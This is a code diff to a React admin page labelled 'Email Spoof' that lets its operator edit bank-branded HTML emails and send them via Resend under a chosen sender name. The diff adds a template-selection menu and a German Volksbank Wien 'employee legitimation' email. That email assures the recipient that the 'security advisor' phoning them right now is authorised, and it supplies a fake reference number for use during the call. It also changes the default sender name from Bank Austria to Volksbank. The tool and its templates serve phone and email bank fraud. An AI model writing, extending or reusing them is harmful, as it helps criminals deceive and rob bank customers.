@@ -23,10 +23,11 @@ import { useToast } from "@/hooks/use-toast";
 import { supabase } from "@/integrations/supabase/client";
 
 
-const STORAGE_KEY = "admin_email_spoof_html_v9";
+const TEMPLATE_KEY = "admin_email_spoof_template_v1";
+const htmlStorageKey = (id: string) => `admin_email_spoof_html_v10_${id}`;
 const RESEND_KEY = "admin_email_spoof_resend_v1";
 
-const defaultHtmlTemplate = `<!DOCTYPE html>
+const stornierungHtml = `<!DOCTYPE html>
 <html lang="de">
 <head>
   <meta charset="UTF-8">
@@ -128,6 +129,127 @@ const defaultHtmlTemplate = `<!DOCTYPE html>
 </body>
 </html>`;
 
+const legitimierungHtml = `<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Volksbank - Mitarbeiter-Legitimierung</title>
+</head>
+<body style="margin:0;padding:0;background-color:#f4f4f4;font-family:Arial,Helvetica,sans-serif;">
+  <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background-color:#f4f4f4;padding:40px 0;">
+    <tr>
+      <td align="center">
+        <table role="presentation" width="600" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.08);">
+
+          <!-- Blue divider -->
+          <tr>
+            <td style="height:3px;background-color:#004899;font-size:0;line-height:0;">&nbsp;</td>
+          </tr>
+
+          <!-- Body -->
+          <tr>
+            <td style="padding:35px 40px 30px 40px;">
+              <h1 style="margin:0 0 25px 0;font-size:20px;color:#1a1a1a;font-weight:700;line-height:1.35;">
+                Legitimierung Ihres Sicherheitsberaters
+              </h1>
+
+              <p style="margin:0 0 18px 0;font-size:15px;line-height:1.6;color:#333333;">
+                {{ANREDE}} {{NACHNAME}},
+              </p>
+
+              <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">
+                zur Ihrer Sicherheit best&auml;tigen wir Ihnen hiermit schriftlich, dass der Sie derzeit telefonisch kontaktierende Sicherheitsberater ein <strong>offiziell autorisierter Mitarbeiter</strong> der Volksbank Wien AG ist. Bitte gleichen Sie die untenstehenden Legitimierungsdaten w&auml;hrend des Gespr&auml;chs mit Ihrem Berater ab.
+              </p>
+
+              <!-- Legitimierungs-Box -->
+              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 25px 0;">
+                <tr>
+                  <td style="background-color:#f1f4f7;border-left:4px solid #004899;border-radius:0 6px 6px 0;padding:20px 24px;">
+                    <p style="margin:0 0 10px 0;font-size:13px;font-weight:700;color:#004899;letter-spacing:0.4px;text-transform:uppercase;">
+                      Legitimierungsdaten
+                    </p>
+                    <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;">
+                      <strong style="color:#1a1a1a;">Sicherheitsberater:</strong> Simon Hengst
+                    </p>
+                    <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;">
+                      <strong style="color:#1a1a1a;">Abteilung:</strong> Sicherheit &amp; Betrugspr&auml;vention
+                    </p>
+                    <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;">
+                      <strong style="color:#1a1a1a;">Referenznummer:</strong> LEG.774218
+                    </p>
+                    <p style="margin:0;font-size:14px;line-height:1.6;color:#333333;">
+                      <strong style="color:#1a1a1a;">G&uuml;ltig bis:</strong> Ende des laufenden Beratungsgespr&auml;chs
+                    </p>
+                  </td>
+                </tr>
+              </table>
+
+              <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">
+                Bitte nennen Sie Ihrem Berater bei R&uuml;ckfragen ausschlie&szlig;lich die oben genannte <strong>Referenznummer</strong>. So stellen wir gemeinsam sicher, dass Sie mit dem korrekten Ansprechpartner verbunden sind.
+              </p>
+
+              <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">
+                <strong>Wichtiger Hinweis:</strong> Die Volksbank fragt Sie zu keinem Zeitpunkt nach Ihrer TAN, PIN oder Ihrem Passwort. Ihr Sicherheitsberater ben&ouml;tigt diese Informationen f&uuml;r die Legitimierung nicht.
+              </p>
+
+              <p style="margin:0;font-size:14px;line-height:1.6;color:#666666;">
+                Sollten Sie Zweifel an der Echtheit des Anrufs haben, beenden Sie das Gespr&auml;ch und wenden Sie sich an Ihre Volksbank-Filiale.
+              </p>
+            </td>
+          </tr>
+
+          <!-- Footer -->
+          <tr>
+            <td style="background-color:#f8f9fa;padding:25px 40px;border-top:1px solid #e5e7eb;">
+              <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
+                <tr>
+                  <td>
+                    <p style="margin:0 0 6px 0;font-size:12px;color:#999999;">
+                      Volksbank Wien AG
+                    </p>
+                    <p style="margin:0 0 12px 0;font-size:12px;color:#999999;">
+                      Dietrichgasse 25, 1030 Wien
+                    </p>
+                    <p style="margin:0;font-size:11px;color:#bbbbbb;">
+                      <a href="https://www.volksbank.at/impressum" style="color:#999999;text-decoration:underline;">Impressum</a>
+                      &nbsp;&middot;&nbsp;
+                      <a href="https://www.volksbank.at/datenschutz" style="color:#999999;text-decoration:underline;">Datenschutz</a>
+                      &nbsp;&middot;&nbsp;
+                      <a href="https://www.volksbank.at" style="color:#999999;text-decoration:underline;">volksbank.at</a>
+                    </p>
+                  </td>
+                </tr>
+              </table>
+            </td>
+          </tr>
+
+        </table>
+      </td>
+    </tr>
+  </table>
+</body>
+</html>`;
+
+type TemplateDef = { id: string; label: string; subject: string; html: string };
+
+const TEMPLATES: TemplateDef[] = [
+  {
+    id: "stornierung",
+    label: "Stornierung Zahlung",
+    subject: "Stornierung Ihrer Zahlung – Referenz STOR.884772",
+    html: stornierungHtml,
+  },
+  {
+    id: "legitimierung",
+    label: "Mitarbeiter-Legitimierung",
+    subject: "Legitimierung Ihres Sicherheitsberaters – Referenz LEG.774218",
+    html: legitimierungHtml,
+  },
+];
+
+const getTemplate = (id: string): TemplateDef => TEMPLATES.find((t) => t.id === id) || TEMPLATES[0];
+
 type ResendConfig = { apiKey: string; fromName: string; fromEmail: string };
 
 const renderTemplate = (html: string, anrede: "Herr" | "Frau", nachname: string) => {
@@ -136,10 +258,17 @@ const renderTemplate = (html: string, anrede: "Herr" | "Frau", nachname: string)
 };
 
 const AdminEmailSpoof = () => {
-  const [htmlCode, setHtmlCode] = useState(() => {
-    if (typeof window === "undefined") return defaultHtmlTemplate;
-    return localStorage.getItem(STORAGE_KEY) || defaultHtmlTemplate;
+  const [templateId, setTemplateId] = useState<string>(() => {
+    if (typeof window === "undefined") return TEMPLATES[0].id;
+    return localStorage.getItem(TEMPLATE_KEY) || TEMPLATES[0].id;
   });
+
+  const [htmlCode, setHtmlCode] = useState(() => {
+    if (typeof window === "undefined") return TEMPLATES[0].html;
+    const id = localStorage.getItem(TEMPLATE_KEY) || TEMPLATES[0].id;
+    return localStorage.getItem(htmlStorageKey(id)) || getTemplate(id).html;
+  });
+
   const [showCode, setShowCode] = useState(false);
   const [copied, setCopied] = useState(false);
 
@@ -158,14 +287,30 @@ const AdminEmailSpoof = () => {
   const [to, setTo] = useState("");
   const [anrede, setAnrede] = useState<"Herr" | "Frau">("Herr");
   const [nachname, setNachname] = useState("");
-  const [subject, setSubject] = useState("Stornierung Ihrer Zahlung – Referenz STOR.884772");
+  const [subject, setSubject] = useState(() => {
+    if (typeof window === "undefined") return TEMPLATES[0].subject;
+    const id = localStorage.getItem(TEMPLATE_KEY) || TEMPLATES[0].id;
+    return getTemplate(id).subject;
+  });
   const [sending, setSending] = useState(false);
 
   const { toast } = useToast();
 
   useEffect(() => {
-    localStorage.setItem(STORAGE_KEY, htmlCode);
-  }, [htmlCode]);
+    localStorage.setItem(htmlStorageKey(templateId), htmlCode);
+  }, [htmlCode, templateId]);
+
+  useEffect(() => {
+    localStorage.setItem(TEMPLATE_KEY, templateId);
+  }, [templateId]);
+
+  const handleTemplateChange = (id: string) => {
+    setTemplateId(id);
+    const stored = localStorage.getItem(htmlStorageKey(id));
+    const tpl = getTemplate(id);
+    setHtmlCode(stored || tpl.html);
+    setSubject(tpl.subject);
+  };
 
   const handleCopy = async () => {
     await navigator.clipboard.writeText(htmlCode);
@@ -175,7 +320,9 @@ const AdminEmailSpoof = () => {
   };
 
   const handleReset = () => {
-    setHtmlCode(defaultHtmlTemplate);
+    const tpl = getTemplate(templateId);
+    setHtmlCode(tpl.html);
+    setSubject(tpl.subject);
     toast({ title: "Auf Original zurückgesetzt" });
   };
 
@@ -237,12 +384,27 @@ const AdminEmailSpoof = () => {
         <div className="flex items-start justify-between gap-4">
           <div>
             <h1 className="text-2xl font-bold tracking-tight text-slate-900">Email Spoof</h1>
-            <p className="mt-1 text-sm text-slate-500">Bank Austria Email-Template bearbeiten und versenden</p>
+            <p className="mt-1 text-sm text-slate-500">Volksbank Email-Template bearbeiten und versenden</p>
           </div>
-          <Button variant="outline" size="sm" onClick={handleReset} className="gap-2 text-xs">
-            <RotateCcw className="h-3.5 w-3.5" />
-            Zurücksetzen
-          </Button>
+          <div className="flex items-center gap-2">
+            <div className="flex items-center gap-2">
+              <Label className="text-xs text-slate-600">Vorlage:</Label>
+              <Select value={templateId} onValueChange={handleTemplateChange}>
+                <SelectTrigger className="h-9 w-[220px] text-xs">
+                  <SelectValue />
+                </SelectTrigger>
+                <SelectContent>
+                  {TEMPLATES.map((t) => (
+                    <SelectItem key={t.id} value={t.id}>{t.label}</SelectItem>
+                  ))}
+                </SelectContent>
+              </Select>
+            </div>
+            <Button variant="outline" size="sm" onClick={handleReset} className="gap-2 text-xs">
+              <RotateCcw className="h-3.5 w-3.5" />
+              Zurücksetzen
+            </Button>
+          </div>
         </div>
 
         {/* Preview */}
@@ -319,7 +481,7 @@ const AdminEmailSpoof = () => {
                 <Label htmlFor="fromName">Absendername</Label>
                 <Input
                   id="fromName"
-                  placeholder="Bank Austria"
+                  placeholder="Volksbank"
                   value={resend.fromName}
                   onChange={(e) => setResend({ ...resend, fromName: e.target.value })}
                   className="mt-1.5"
